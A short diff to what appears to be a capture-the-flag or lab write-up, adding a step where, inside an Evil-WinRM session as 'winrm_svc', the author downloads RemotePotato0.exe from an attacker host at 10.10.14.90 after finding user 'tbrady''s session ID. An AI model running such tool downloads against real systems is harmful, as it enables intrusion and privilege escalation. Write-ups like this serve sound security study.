@@ -365,3 +365,7 @@ I can try something like remotepotato
 ```
 I have found the session ID of `tbrady`
 
+```python
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> wget http://10.10.14.90:8000/RemotePotato0.exe -o rp.exe
+
+```
